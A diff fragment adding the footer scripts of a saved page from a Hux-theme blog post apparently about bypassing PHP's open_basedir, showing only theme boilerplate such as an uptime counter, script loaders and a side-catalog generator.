+    var hour=Math.floor(time%(24*60*60)/(60*60));
+    var minute=Math.floor(time%(24*60*60)%(60*60)/60);
+    var second=Math.floor(time%(24*60*60)%(60*60)%60);
+    var str="我的博客已默默运行了" + day + "天" + hour +"时" + minute + "分" + second + "秒";
+    document.getElementById('count').innerHTML=str;
+  }
+</script>
+
+<!-- jQuery -->
+<!--<script src="/js/jquery.min.js "></script>-->
+<!--<script src="//cdn.bootcss.com/jquery/2.2.2/jquery.min.js"></script>-->
+
+
+<!-- Bootstrap Core JavaScript -->
+<!--<script src="/js/bootstrap.min.js "></script>-->
+<!--<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>-->
+
+
+<!-- Custom Theme JavaScript -->
+<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/hux-blog.min.js.下载"></script>
+
+<!-- Service Worker -->
+
+<script type="text/javascript">
+    if(navigator.serviceWorker){
+        // For security reasons, a service worker can only control the pages that are in the same directory level or below it. That's why we put sw.js at ROOT level.
+        navigator.serviceWorker
+            .register('/sw.js')
+            .then((registration) => {console.log('Service Worker Registered. ', registration)})
+            .catch((error) => {console.log('ServiceWorker registration failed: ', error)})
+    }
+</script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/ 
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers   
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async('/js/jquery.tagcloud.js',function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+<!-- Side Catalog -->
+
+<script type="text/javascript">
+    function generateCatalog (selector) {
+        var P = $('div.post-container'),a,n,t,l,i,c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#"+$(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="'+i+'" rel="nofollow">'+t+'</a>');
+            l = $('<li class="'+n+'_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;    
+    }
+
+    generateCatalog(".catalog-body");
+
+    // toggle side catalog
+    $(".catalog-toggle").click((function(e){
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    /*
+     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
+     * Fork by Hux to support padding
+     */
+    async("/js/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/apple-touch-icon.png" width="0" height="0">
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+
+
+
+</body></html>
